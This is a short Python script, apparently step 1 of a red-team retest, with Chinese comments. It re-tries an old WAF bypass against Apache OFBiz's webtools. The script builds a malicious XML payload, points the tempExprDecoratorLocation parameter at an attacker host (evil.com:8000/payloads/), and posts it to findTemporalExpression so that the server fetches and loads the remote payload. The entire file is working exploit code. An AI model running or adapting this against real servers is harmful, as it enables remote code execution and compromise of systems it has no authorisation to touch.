# -*- coding: utf-8 -*-
"""RT-2 步骤1：旧绕过复测（findTemporalExpression + tempExprDecoratorLocation=http URL，过 WAF 18381）。"""
import sys

sys.path.insert(0, "..")
from rt2_lib import post, xml_payload  # noqa: E402

fname = xml_payload("TemporalExpressionDecorator", "pwn_rt2_old_waf",
                    "ofbiz_rt2_old.xml")
payload_url = "http://evil.com:8000/payloads/" + fname
r = post("/webtools/control/main/findTemporalExpression",
         data={"tempExprDecoratorLocation": payload_url})
print("[old-bypass/waf] POST /webtools/control/main/findTemporalExpression")
print("  body: tempExprDecoratorLocation=" + payload_url)
print("  -> HTTP %s (%dB)" % (r.status_code, len(r.content)))
open("NUL", "w").close()
